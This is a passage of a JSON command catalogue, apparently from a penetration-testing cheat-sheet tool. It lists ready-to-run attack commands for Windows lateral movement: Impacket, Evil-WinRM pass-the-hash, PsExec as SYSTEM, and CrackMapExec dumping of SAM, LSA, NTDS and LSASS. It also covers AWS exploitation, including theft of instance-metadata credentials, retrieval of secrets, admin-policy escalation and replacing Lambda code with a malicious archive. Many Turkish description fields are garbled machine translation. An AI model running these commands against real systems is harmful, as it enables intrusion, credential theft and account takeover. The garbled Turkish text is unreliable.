            "desc": "Execute command via Task Scheduler service",
            "desc_tr": "Çalıştır: command Task Scheduler service üzerinden"
          },
          {
            "title": "Impacket DCOMExec",
            "cmd": "impacket-dcomexec '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Shell via DCOM (MMC20, ShellWindows, ShellBrowserWindow)",
            "desc_tr": "Shell DCOM (MMC20, ShellWindows, ShellBrowserWindow) üzerinden"
          },
          {
            "title": "Impacket DCOMExec (Specific Object)",
            "cmd": "impacket-dcomexec -object MMC20 '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "Specify the DCOM object to use for execution",
            "desc_tr": "Specify the DCOM object use for execution'e"
          },
          {
            "title": "Impacket PsExec (Kerberos)",
            "cmd": "export KRB5CCNAME=<USER>.ccache && impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_HOSTNAME>",
            "tags": [
              "advanced"
            ],
            "desc": "PsExec using Kerberos ticket authentication",
            "desc_tr": "PsExec Kerberos ticket kimlik doğrulama kullanarak"
          },
          {
            "title": "DCOMExec",
            "desc": "Execute via DCOM",
            "cmds": [
              "impacket-dcomexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
              "impacket-dcomexec -hashes <LM>:<NT> <DOMAIN>/<USER>@<TARGET_IP>"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: DCOM üzerinden"
          }
        ],
        "name_tr": "Impacket Execution"
      },
      {
        "name": "WinRM & PowerShell Remoting",
        "commands": [
          {
            "title": "Evil-WinRM (Password)",
            "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc": "Interactive PowerShell shell via WinRM with password",
            "desc_tr": "Interactive PowerShell shell WinRM password üzerinden ile"
          },
          {
            "title": "Evil-WinRM (Hash)",
            "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>",
            "tags": [
              "essential"
            ],
            "desc": "WinRM shell with Pass the Hash",
            "desc_tr": "WinRM shell Pass the Hash ile"
          },
          {
            "title": "Evil-WinRM (Key-Based)",
            "cmd": "evil-winrm -i <TARGET_IP> -c certificate.pem -k private_key.pem -S",
            "tags": [
              "advanced"
            ],
            "desc": "WinRM shell with certificate-based authentication",
            "desc_tr": "WinRM shell certificate-based kimlik doğrulama ile"
          },
          {
            "title": "Evil-WinRM Upload File",
            "cmd": "upload /local/path/file.exe C:\\Temp\\file.exe",
            "tags": [
              "essential"
            ],
            "desc": "Upload a file to target via Evil-WinRM session",
            "desc_tr": "Yükle: a file target Evil-WinRM sessiüzerinden üzerinde'e"
          },
          {
            "title": "Evil-WinRM Download File",
            "cmd": "download C:\\Users\\<USER>\\Desktop\\flag.txt /local/path/",
            "tags": [
              "essential"
            ],
            "desc": "Download a file from target via Evil-WinRM session",
            "desc_tr": "İndir: a file target Evil-WinRM sessiüzerinden üzerinden üzerinde"
          },
          {
            "title": "Enter-PSSession (PowerShell)",
            "cmd": "Enter-PSSession -ComputerName <TARGET_HOSTNAME> -Credential <DOMAIN>\\<USER>",
            "tags": [
              "essential"
            ],
            "desc": "Interactive PowerShell remoting session",
            "desc_tr": "Interactive PowerShell remoting session"
          },
          {
            "title": "Invoke-Command (Single Host)",
            "cmd": "Invoke-Command -ComputerName <TARGET_HOSTNAME> -Credential $cred -ScriptBlock { whoami; hostname }",
            "tags": [
              "essential"
            ],
            "desc": "Execute commands on a remote host via PS remoting",
            "desc_tr": "Çalıştır: commands a uzak host PS remoting üzerinden üzerinde"
          },
          {
            "title": "Invoke-Command (Multiple Hosts)",
            "cmd": "Invoke-Command -ComputerName @('<HOST1>','<HOST2>','<HOST3>') -Credential $cred -ScriptBlock { whoami }",
            "tags": [
              "tool"
            ],
            "desc": "Execute commands on multiple remote hosts simultaneously",
            "desc_tr": "Çalıştır: commands multiple uzak hosts simultaneously üzerinde"
          },
          {
            "title": "New-PSSession Persistent",
            "cmds": [
              "$session = New-PSSession -ComputerName <TARGET_HOSTNAME> -Credential $cred",
              "Enter-PSSession $session"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Create and enter a persistent PowerShell remoting session",
            "desc_tr": "Oluştur: and enter a persistent PowerShell remoting session"
          },
          {
            "title": "WinRS Remote Command",
            "cmd": "winrs -r:<TARGET_HOSTNAME> -u:<USER> -p:<PASS> \"whoami\"",
            "tags": [
              "tool"
            ],
            "desc": "Execute command remotely via Windows Remote Shell",
            "desc_tr": "Çalıştır: command remotely Windows uzak Shell üzerinden"
          },
          {
            "title": "Invoke-Command Multi",
            "desc": "Execute on multiple targets",
            "cmd": "Invoke-Command -ComputerName <TARGET1>,<TARGET2> -ScriptBlock { whoami } -Credential <DOMAIN>\\<USER>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: multiple targets üzerinde"
          },
          {
            "title": "New-PSSession + Copy",
            "desc": "Create session and copy files",
            "cmds": [
              "$s = New-PSSession -ComputerName <TARGET_IP> -Credential <DOMAIN>\\<USER>",
              "Copy-Item -Path C:\\local\\file -Destination C:\\temp\\file -ToSession $s",
              "Enter-PSSession $s"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Oluştur: sessiand copy files üzerinde"
          },
          {
            "title": "runas /netonly",
            "desc": "Run with different domain creds",
            "cmd": "runas /netonly /user:<DOMAIN>\\<USER> cmd.exe",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: different domacreds ile içinde"
          }
        ],
        "name_tr": "WinRM & PowerShell Remoting"
      },
      {
        "name": "Windows Remote Services",
        "commands": [
          {
            "title": "PsExec.exe (Sysinternals)",
            "cmd": "PsExec.exe \\\\<TARGET_IP> -u <DOMAIN>\\<USER> -p <PASS> -accepteula cmd.exe",
            "tags": [
              "essential"
            ],
            "desc": "Remote execution using Sysinternals PsExec binary",
            "desc_tr": "Uzaktan executiSysinternals PsExec binary kullanarak üzerinde"
          },
          {
            "title": "PsExec.exe as SYSTEM",
            "cmd": "PsExec.exe \\\\<TARGET_IP> -u <DOMAIN>\\<USER> -p <PASS> -s -accepteula cmd.exe",
            "tags": [
              "essential"
            ],
            "desc": "Run remote command as SYSTEM with PsExec",
            "desc_tr": "Çalıştır: uzak command as SYSTEM PsExec ile"
          },
          {
            "title": "Remote Service Creation (sc.exe)",
            "cmds": [
              "sc \\\\<TARGET_IP> create remotesvc binpath= \"cmd.exe /c <COMMAND>\"",
              "sc \\\\<TARGET_IP> start remotesvc",
              "sc \\\\<TARGET_IP> delete remotesvc"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Create and start a remote service for command execution",
            "desc_tr": "Oluştur: and start a uzak service for komut enjeksiyonu"
          },
          {
            "title": "Remote Scheduled Task",
            "cmds": [
              "schtasks /create /s <TARGET_IP> /u <USER> /p <PASS> /tn \"TaskName\" /tr \"cmd.exe /c <COMMAND>\" /sc once /st 00:00",
              "schtasks /run /s <TARGET_IP> /u <USER> /p <PASS> /tn \"TaskName\"",
              "schtasks /delete /s <TARGET_IP> /u <USER> /p <PASS> /tn \"TaskName\" /f"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Create, run, and clean up a remote scheduled task",
            "desc_tr": "Create, run, and clean up a uzak zamanlanmış görevler"
          },
          {
            "title": "WMIC Remote Process Create",
            "cmd": "wmic /node:<TARGET_IP> /user:<USER> /password:<PASS> process call create \"cmd.exe /c <COMMAND>\"",
            "tags": [
              "tool"
            ],
            "desc": "Execute a remote process via WMI command line",
            "desc_tr": "Çalıştır: a uzak process WMI command line üzerinden"
          },
          {
            "title": "CrackMapExec Command Exec",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -x 'whoami'",
            "tags": [
              "essential"
            ],
            "desc": "Execute command via SMB with CrackMapExec",
            "desc_tr": "Çalıştır: command SMB CrackMapExec üzerinden ile"
          },
          {
            "title": "CrackMapExec PowerShell Exec",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -X 'Get-Process'",
            "tags": [
              "essential"
            ],
            "desc": "Execute PowerShell command via SMB with CME",
            "desc_tr": "Çalıştır: PowerShell command SMB CME üzerinden ile"
          },
          {
            "title": "CrackMapExec Dump SAM",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --sam",
            "tags": [
              "essential"
            ],
            "desc": "Dump local SAM hashes from target via CME",
            "desc_tr": "Dökümle: yerel SAM hashes target CME üzerinden üzerinden"
          },
          {
            "title": "CrackMapExec Dump LSA",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --lsa",
            "tags": [
              "tool"
            ],
            "desc": "Dump LSA secrets from target via CME",
            "desc_tr": "Dökümle: LSA secrets target CME üzerinden üzerinden"
          },
          {
            "title": "CrackMapExec Dump NTDS",
            "cmd": "crackmapexec smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --ntds",
            "tags": [
              "essential"
            ],
            "desc": "Dump all domain hashes from NTDS.dit via CME",
            "desc_tr": "Dökümle: tüm domahashes NTDS.dit CME üzerinden üzerinden içinde"
          },
          {
            "title": "Runas with Network Credentials",
            "cmd": "runas /netonly /user:<DOMAIN>\\<USER> cmd.exe",
            "tags": [
              "tool"
            ],
            "desc": "Spawn cmd.exe with alternate network credentials",
            "note": "Only affects network authentication, not local",
            "desc_tr": "Başlat: cmd.exe alternate network kimlik bilgileri ile"
          },
          {
            "title": "SharpRDP Remote Desktop Exec",
            "cmd": "SharpRDP.exe computername=<TARGET_IP> command=\"cmd.exe /c <COMMAND>\" username=<DOMAIN>\\<USER> password=<PASS>",
            "tags": [
              "advanced"
            ],
            "desc": "Execute commands via RDP protocol without full GUI session",
            "desc_tr": "Çalıştır: commands RDP protocol full GUI sessiüzerinden üzerinde olmadan"
          }
        ],
        "name_tr": "Windows Remote Services"
      },
      {
        "name": "RDP Access",
        "commands": [
          {
            "title": "xfreerdp (Password)",
            "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /d:<DOMAIN> /dynamic-resolution +clipboard",
            "tags": [
              "essential"
            ],
            "desc": "Connect via RDP with xfreerdp",
            "desc_tr": "Bağlan: RDP xfreerdp üzerinden ile"
          },
          {
            "title": "xfreerdp (Hash — Restricted Admin)",
            "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<NTLM_HASH> /d:<DOMAIN> /dynamic-resolution",
            "tags": [
              "advanced"
            ],
            "desc": "RDP Pass the Hash via Restricted Admin mode",
            "desc_tr": "RDP Pass the Hash Restricted Admmode üzerinden içinde"
          },
          {
            "title": "xfreerdp with Drive Sharing",
            "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /d:<DOMAIN> /drive:share,/tmp/share",
            "tags": [
              "tool"
            ],
            "desc": "RDP connection with a shared local directory",
            "desc_tr": "RDP connectia shared yerel directory ile üzerinde"
          },
          {
            "title": "rdesktop",
            "cmd": "rdesktop -u <USER> -p '<PASS>' -d <DOMAIN> <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Connect via RDP with rdesktop",
            "desc_tr": "Bağlan: RDP rdesktop üzerinden ile"
          },
          {
            "title": "Enable RDP Remotely",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -M rdp -o ACTION=enable",
            "tags": [
              "advanced"
            ],
            "desc": "Enable RDP on a remote host via CrackMapExec",
            "desc_tr": "Etkinleştir: RDP a uzak host CrackMapExec üzerinden üzerinde"
          },
          {
            "title": "xfreerdp with Certificate Ignore",
            "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /cert-ignore /dynamic-resolution +clipboard",
            "tags": [
              "essential"
            ],
            "desc": "RDP ignoring certificate warnings",
            "desc_tr": "RDP ignoring certificate warnings"
          },
          {
            "title": "RDP Pass-the-Hash Check",
            "cmd": "crackmapexec rdp <TARGET_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc": "Test if RDP PtH via Restricted Admin is possible",
            "desc_tr": "Test et: if RDP PtH Restricted Admis possible üzerinden içinde"
          }
        ],
        "name_tr": "RDP Access"
      },
      {
        "name": "File Shares & Data Collection",
        "commands": [
          {
            "title": "Map Network Share",
            "cmd": "net use Z: \\\\<TARGET_IP>\\<SHARE> /user:<DOMAIN>\\<USER> <PASS>",
            "tags": [
              "essential"
            ],
            "desc": "Map a network share to a drive letter",
            "desc_tr": "Map a network share a drive letter'e"
          },
          {
            "title": "List Remote Shares",
            "cmd": "net view \\\\<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "List available shares on a remote host",
            "desc_tr": "Listele: available shares a uzak host üzerinde"
          },
          {
            "title": "Access Share via smbclient",
            "cmd": "smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'",
            "tags": [
              "essential"
            ],
            "desc": "Interactive SMB client to browse and transfer files",
            "desc_tr": "Interactive SMB client browse and transfer files'e"
          },
          {
            "title": "CME Spider Shares",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --spider C$ --depth 3 --pattern txt,xml,config,ini,ps1",
            "tags": [
              "tool"
            ],
            "desc": "Spider remote shares for interesting files",
            "desc_tr": "Spider uzak shares for ilginç files"
          },
          {
            "title": "Impacket SMBClient",
            "cmd": "impacket-smbclient '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Interactive SMB client via impacket",
            "desc_tr": "Interactive SMB client impacket üzerinden"
          },
          {
            "title": "Copy File via SMB",
            "cmd": "copy \\\\<TARGET_IP>\\C$\\Windows\\Temp\\output.txt C:\\Temp\\",
            "tags": [
              "tool"
            ],
            "desc": "Copy files from remote share via Windows copy command",
            "desc_tr": "Kopyala: files uzak share Windows copy command üzerinden üzerinden"
          },
          {
            "title": "CME lsassy",
            "desc": "Dump LSASS remotely",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -M lsassy",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: LSASS remotely"
          }
        ],
        "name_tr": "File Shares & Data Collection"
      }
    ],
    "name_tr": "Yanal Hareket Teknikleri",
    "description_tr": "Move laterally across the network using remote execution and Windows protocols"
  },
  {
    "id": "cloud-aws",
    "name": "AWS Cloud Security Testing",
    "icon": "☁️",
    "description": "Enumerate and exploit AWS cloud services, IAM, S3, EC2, and more",
    "subcategories": [
      {
        "name": "Credential Configuration",
        "commands": [
          {
            "title": "Configure AWS CLI",
            "cmd": "aws configure",
            "tags": [
              "essential"
            ],
            "desc": "Set up AWS access key, secret key, region, and output format",
            "desc_tr": "Ayarla: up AWS access key, secret key, region, and output format"
          },
          {
            "title": "Set AWS Env Variables",
            "cmds": [
              "export AWS_ACCESS_KEY_ID='<ACCESS_KEY>'",
              "export AWS_SECRET_ACCESS_KEY='<SECRET_KEY>'",
              "export AWS_DEFAULT_REGION='us-east-1'"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Set AWS credentials via environment variables",
            "desc_tr": "Ayarla: AWS kimlik bilgileri ortam değişkenleri üzerinden"
          },
          {
            "title": "Set Session Token",
            "cmd": "export AWS_SESSION_TOKEN='<SESSION_TOKEN>'",
            "tags": [
              "tool"
            ],
            "desc": "Set temporary session token for assumed roles",
            "desc_tr": "Ayarla: temporary sessitoken for assumed roles üzerinde"
          },
          {
            "title": "Verify Current Identity",
            "cmd": "aws sts get-caller-identity",
            "tags": [
              "essential"
            ],
            "desc": "Show the current AWS identity (account, ARN, user ID)",
            "desc_tr": "Göster: the mevcut AWS identity (account, ARN, user ID)"
          },
          {
            "title": "Use Specific Profile",
            "cmd": "aws sts get-caller-identity --profile <PROFILE_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Verify identity for a specific named profile",
            "desc_tr": "Doğrula: identity for a belirli named profile"
          },
          {
            "title": "Assume IAM Role",
            "cmd": "aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME> --role-session-name pentest",
            "tags": [
              "essential"
            ],
            "desc": "Assume an IAM role and get temporary credentials",
            "desc_tr": "Assume an IAM role and get temporary kimlik bilgileri"
          }
        ],
        "name_tr": "Credential Configuration"
      },
      {
        "name": "IAM Reconnaissance",
        "commands": [
          {
            "title": "List IAM Users",
            "cmd": "aws iam list-users",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all IAM users in the account",
            "desc_tr": "Listele: tüm IAM users the account içinde"
          },
          {
            "title": "List IAM Roles",
            "cmd": "aws iam list-roles",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all IAM roles in the account",
            "desc_tr": "Listele: tüm IAM roles the account içinde"
          },
          {
            "title": "List IAM Groups",
            "cmd": "aws iam list-groups",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all IAM groups in the account",
            "desc_tr": "Listele: tüm IAM groups the account içinde"
          },
          {
            "title": "List Managed Policies",
            "cmd": "aws iam list-policies --only-attached",
            "tags": [
              "essential"
            ],
            "desc": "List all attached managed policies",
            "desc_tr": "Listele: tüm attached managed policies"
          },
          {
            "title": "Get User Inline Policy",
            "cmd": "aws iam get-user-policy --user-name <USER> --policy-name <POLICY_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Retrieve the contents of an inline user policy",
            "desc_tr": "Al: the contents of an inline user policy"
          },
          {
            "title": "List Attached User Policies",
            "cmd": "aws iam list-attached-user-policies --user-name <USER>",
            "tags": [
              "essential"
            ],
            "desc": "List managed policies attached to a specific user",
            "desc_tr": "Listele: managed policies attached a belirli user'e"
          },
          {
            "title": "List User Inline Policies",
            "cmd": "aws iam list-user-policies --user-name <USER>",
            "tags": [
              "tool"
            ],
            "desc": "List inline policies for a specific user",
            "desc_tr": "Listele: inline policies for a belirli user"
          },
          {
            "title": "Get Policy Version Detail",
            "cmd": "aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id v1",
            "tags": [
              "tool"
            ],
            "desc": "View the actual permissions in a managed policy version",
            "desc_tr": "View the actual permissions a managed policy version içinde"
          },
          {
            "title": "List Group Policies",
            "cmd": "aws iam list-attached-group-policies --group-name <GROUP>",
            "tags": [
              "tool"
            ],
            "desc": "List managed policies attached to a group",
            "desc_tr": "Listele: managed policies attached a group'e"
          },
          {
            "title": "List Role Policies",
            "cmd": "aws iam list-attached-role-policies --role-name <ROLE>",
            "tags": [
              "tool"
            ],
            "desc": "List managed policies attached to a role",
            "desc_tr": "Listele: managed policies attached a role'e"
          },
          {
            "title": "Get Access Key Info",
            "cmd": "aws iam list-access-keys --user-name <USER>",
            "tags": [
              "tool"
            ],
            "desc": "List access keys for a user",
            "desc_tr": "Listele: access keys for a user"
          },
          {
            "title": "Enumerate-IAM Script",
            "cmd": "python3 enumerate-iam.py --access-key <ACCESS_KEY> --secret-key <SECRET_KEY>",
            "tags": [
              "essential"
            ],
            "desc": "Brute force API permissions for the current identity",
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı API permissions for the mevcut identity"
          }
        ],
        "name_tr": "IAM Reconnaissance"
      },
      {
        "name": "Storage & Compute Enumeration",
        "commands": [
          {
            "title": "List S3 Buckets",
            "cmd": "aws s3 ls",
            "tags": [
              "essential"
            ],
            "desc": "List all S3 buckets in the account",
            "desc_tr": "Listele: tüm S3 buckets the account içinde"
          },
          {
            "title": "List S3 Bucket Contents",
            "cmd": "aws s3 ls s3://<BUCKET_NAME>/ --recursive",
            "tags": [
              "essential"
            ],
            "desc": "Recursively list all objects in a bucket",
            "desc_tr": "Recursively list tüm objects a bucket içinde"
          },
          {
            "title": "Download S3 Object",
            "cmd": "aws s3 cp s3://<BUCKET_NAME>/<KEY> ./loot/",
            "tags": [
              "essential"
            ],
            "desc": "Download a file from S3",
            "desc_tr": "İndir: a file S3 üzerinden"
          },
          {
            "title": "Sync S3 Bucket",
            "cmd": "aws s3 sync s3://<BUCKET_NAME>/ ./loot/<BUCKET_NAME>/",
            "tags": [
              "tool"
            ],
            "desc": "Download entire bucket contents",
            "desc_tr": "İndir: entire bucket contents"
          },
          {
            "title": "Public S3 Access (No Auth)",
            "cmd": "aws s3 ls s3://<BUCKET_NAME>/ --no-sign-request",
            "tags": [
              "essential"
            ],
            "desc": "List bucket contents without authentication",
            "desc_tr": "Listele: bucket contents kimlik doğrulama olmadan"
          },
          {
            "title": "Get Bucket ACL",
            "cmd": "aws s3api get-bucket-acl --bucket <BUCKET_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Check the access control list of a bucket",
            "desc_tr": "Kontrol et: the access control list of a bucket"
          },
          {
            "title": "Get Bucket Policy",
            "cmd": "aws s3api get-bucket-policy --bucket <BUCKET_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Retrieve the bucket policy JSON",
            "desc_tr": "Al: the bucket policy JSON"
          },
          {
            "title": "Check Bucket Website",
            "cmd": "aws s3api get-bucket-website --bucket <BUCKET_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Check if bucket is configured as a static website",
            "desc_tr": "Kontrol et: if bucket is configured as a static website"
          },
          {
            "title": "Describe EC2 Instances",
            "cmd": "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress,Tags[?Key==`Name`].Value|[0]]' --output table",
            "tags": [
              "essential"
            ],
            "desc": "List all EC2 instances with key details",
            "desc_tr": "Listele: tüm EC2 instances key details ile"
          },
          {
            "title": "Describe Security Groups",
            "cmd": "aws ec2 describe-security-groups --query 'SecurityGroups[*].[GroupId,GroupName,IpPermissions]'",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate security group rules for open ports",
            "desc_tr": "Listele: security group rules for açık portlar"
          },
          {
            "title": "Describe VPCs",
            "cmd": "aws ec2 describe-vpcs",
            "tags": [
              "tool"
            ],
            "desc": "List all VPCs in the region",
            "desc_tr": "Listele: tüm VPCs the region içinde"
          },
          {
            "title": "Describe Subnets",
            "cmd": "aws ec2 describe-subnets --query 'Subnets[*].[SubnetId,CidrBlock,AvailabilityZone,Tags[?Key==`Name`].Value|[0]]' --output table",
            "tags": [
              "tool"
            ],
            "desc": "List all subnets with CIDR info",
            "desc_tr": "Listele: tüm subnets CIDR info ile"
          },
          {
            "title": "Describe Snapshots (Own)",
            "cmd": "aws ec2 describe-snapshots --owner-ids self",
            "tags": [
              "essential"
            ],
            "desc": "List EBS snapshots owned by current account",
            "desc_tr": "Listele: EBS snapshots owned by mevcut account"
          },
          {
            "title": "List Lambda Functions",
            "cmd": "aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table",
            "tags": [
              "essential"
            ],
            "desc": "List all Lambda functions with runtime info",
            "desc_tr": "Listele: tüm Lambda functions runtime info ile"
          },
          {
            "title": "Get Lambda Function Code",
            "cmd": "aws lambda get-function --function-name <FUNCTION_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Get Lambda function details and download code URL",
            "desc_tr": "Al: Lambda functidetails and download code URL üzerinde"
          },
          {
            "title": "Get Lambda Policy",
            "cmd": "aws lambda get-policy --function-name <FUNCTION_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Get resource-based policy for a Lambda function",
            "desc_tr": "Al: resource-based policy for a Lambda function"
          },
          {
            "title": "Describe RDS Instances",
            "cmd": "aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,Endpoint.Address,PubliclyAccessible]' --output table",
            "tags": [
              "essential"
            ],
            "desc": "List RDS database instances",
            "desc_tr": "Listele: RDS database instances"
          },
          {
            "title": "List EKS Clusters",
            "cmd": "aws eks list-clusters",
            "tags": [
              "tool"
            ],
            "desc": "List all EKS Kubernetes clusters",
            "desc_tr": "Listele: tüm EKS Kubernetes clusters"
          },
          {
            "title": "List ECR Images",
            "cmd": "aws ecr list-images --repository-name <REPO_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "List images in an ECR container registry",
            "desc_tr": "Listele: images an ECR container registry içinde"
          },
          {
            "title": "EC2 Snapshots",
            "desc": "Find snapshots with secrets",
            "cmd": "aws ec2 describe-snapshots --owner-ids self --output table",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: snapshots secrets ile"
          },
          {
            "title": "EC2 User Data",
            "desc": "Check user data for secrets",
            "cmd": "aws ec2 describe-instance-attribute --instance-id <ID> --attribute userData --query 'UserData.Value' | base64 -d",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: user data for secrets"
          },
          {
            "title": "DynamoDB Scan",
            "desc": "Dump table contents",
            "cmd": "aws dynamodb scan --table-name <TABLE>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dökümle: table contents"
          },
          {
            "title": "CloudWatch Logs",
            "desc": "Enumerate log groups",
            "cmd": "aws logs describe-log-groups",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: log groups"
          }
        ],
        "name_tr": "Storage & Compute Enumeration"
      },
      {
        "name": "Secrets & Metadata",
        "commands": [
          {
            "title": "List Secrets Manager Secrets",
            "cmd": "aws secretsmanager list-secrets",
            "tags": [
              "essential"
            ],
            "desc": "List all secrets in AWS Secrets Manager",
            "desc_tr": "Listele: tüm secrets AWS Secrets Manager içinde"
          },
          {
            "title": "Get Secret Value",
            "cmd": "aws secretsmanager get-secret-value --secret-id <SECRET_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Retrieve the actual secret value",
            "desc_tr": "Al: the actual secret value"
          },
          {
            "title": "List SSM Parameters",
            "cmd": "aws ssm describe-parameters",
            "tags": [
              "essential"
            ],
            "desc": "List all SSM Parameter Store entries",
            "desc_tr": "Listele: tüm SSM Parameter Store entries"
          },
          {
            "title": "Get SSM Parameter (Decrypted)",
            "cmd": "aws ssm get-parameter --name <PARAM_NAME> --with-decryption",
            "tags": [
              "essential"
            ],
            "desc": "Get SSM parameter value including SecureString decryption",
            "desc_tr": "Al: SSM parameter value including SecureString decryption"
          },
          {
            "title": "IMDSv1 — Get Credentials",
            "cmd": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Retrieve IAM role credentials from EC2 instance metadata v1",
            "note": "Only works from within an EC2 instance",
            "desc_tr": "Al: IAM role kimlik bilgileri EC2 instance metadata v1 üzerinden"
          },
          {
            "title": "IMDSv2 — Get Token + Credentials",
            "cmds": [
              "TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')",
              "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Retrieve credentials from IMDSv2 (token required)",
            "desc_tr": "Al: kimlik bilgileri IMDSv2 (token required) üzerinden"
          },
          {
            "title": "IMDS — List Available Roles",
            "cmd": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "tags": [
              "tool"
            ],
            "desc": "Discover IAM roles available on the instance",
            "desc_tr": "Keşfet: IAM roles available the instance üzerinde"
          },
          {
            "title": "EC2 User Data",
            "cmd": "aws ec2 describe-instance-attribute --instance-id <INSTANCE_ID> --attribute userData --query 'UserData.Value' --output text | base64 -d",
            "tags": [
              "essential"
            ],
            "desc": "Retrieve and decode EC2 instance user data (may contain secrets)",
            "desc_tr": "Al: and kod çözme EC2 instance user data (may contasecrets) içinde"
          }
        ],
        "name_tr": "Secrets & Metadata"
      },
      {
        "name": "Privilege Escalation",
        "commands": [
          {
            "title": "Create Access Key for User",
            "cmd": "aws iam create-access-key --user-name <USER>",
            "tags": [
              "essential"
            ],
            "desc": "Create new access keys for a user (requires iam:CreateAccessKey)",
            "desc_tr": "Oluştur: new access keys for a user (requires iam:CreateAccessKey)"
          },
          {
            "title": "Attach Admin Policy to User",
            "cmd": "aws iam attach-user-policy --user-name <USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            "tags": [
              "essential"
            ],
            "desc": "Attach the AdministratorAccess policy to a user",
            "desc_tr": "Attach the AdministratorAccess policy a user'e"
          },
          {
            "title": "Put Inline Admin Policy",
            "cmd": "aws iam put-user-policy --user-name <USER> --policy-name AdminPolicy --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'",
            "tags": [
              "advanced"
            ],
            "desc": "Add an inline policy granting full access to a user",
            "desc_tr": "Ekle: an inline policy granting full access a user'e"
          },
          {
            "title": "Add User to Admin Group",
            "cmd": "aws iam add-user-to-group --user-name <USER> --group-name <ADMIN_GROUP>",
            "tags": [
              "tool"
            ],
            "desc": "Add user to a group with elevated permissions",
            "desc_tr": "Ekle: user a group elevated permissions ile'e"
          },
          {
            "title": "Update Lambda Code for Escalation",
            "cmd": "aws lambda update-function-code --function-name <FUNCTION_NAME> --zip-file fileb://malicious.zip",
            "tags": [
              "advanced"
            ],
            "desc": "Replace Lambda function code to escalate via its IAM role",
            "desc_tr": "Değiştir: Lambda functicode escalate its IAM role üzerinden üzerinde'e"
          },
          {
            "title": "Create Login Profile",
            "cmd": "aws iam create-login-profile --user-name <USER> --password '<PASS>' --no-password-reset-required",
            "tags": [
              "advanced"
            ],
            "desc": "Create console login for a user that only had API access",
            "desc_tr": "Oluştur: console logfor a user that only had API access içinde"
          }
        ],
        "name_tr": "Privilege Escalation"
      },
      {
        "name": "Automated Tools",
        "commands": [
          {
            "title": "Pacu — Start Framework",
            "cmd": "pacu",
            "tags": [
              "essential"
            ],
            "desc": "Launch Pacu AWS exploitation framework",
